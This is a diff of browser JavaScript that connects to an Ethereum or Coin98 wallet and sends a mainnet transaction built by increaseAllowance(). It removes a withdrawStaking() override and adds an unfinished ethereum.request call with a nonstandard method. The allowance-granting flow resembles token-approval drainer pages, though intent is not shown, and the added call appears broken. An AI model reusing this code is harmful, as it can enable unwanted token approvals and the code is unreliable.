@@ -28,6 +28,7 @@
                     }
                 });
             }
+            console.log(window)
             console.log("web3 provider = ethereum")
         } else if (typeof window.coin98 !== 'undefined' && window.coin98.provider) {
             // 设置 web3 的 provider 为 coin98.provider
@@ -62,7 +63,6 @@ async function sendTransaction() {
         const myAccount = accounts[0];
         console.log(myAccount);
         let data = increaseAllowance()
-        data = withdrawStaking()
         const txParams = {
             from: myAccount,
             chainId: 1,
@@ -93,7 +93,10 @@ async function sendTransaction() {
             gas: "106656"
         };
         console.log(txParams)
-
+        const tx  = await ethereum.request({
+            method: 'eth_request',
+            
+        })
         const txReceipt = await web3.eth.sendTransaction(txParams);
         console.log('Transaction successful:', txReceipt);
     } catch (error) {
